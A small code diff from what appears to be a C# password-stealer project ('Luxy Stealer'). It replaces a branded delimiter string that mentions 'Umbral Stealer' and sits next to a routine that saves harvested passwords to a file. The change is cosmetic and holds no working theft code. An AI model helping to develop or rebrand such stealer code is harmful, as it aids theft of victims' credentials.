@@ -16,7 +16,7 @@ namespace LuxyStub.Modules.Stealer.Components.Utilities
 
         static SaveData()
         {
-            Delimeter = "[Umbral Stealer]==================Luxy Stealer==================[Umbral Stealer]";
+            Delimeter = "==================Luxy Stealer==================";
         }
 
         internal static async Task SaveToFile(PasswordFormat[] passwords, string filepath)
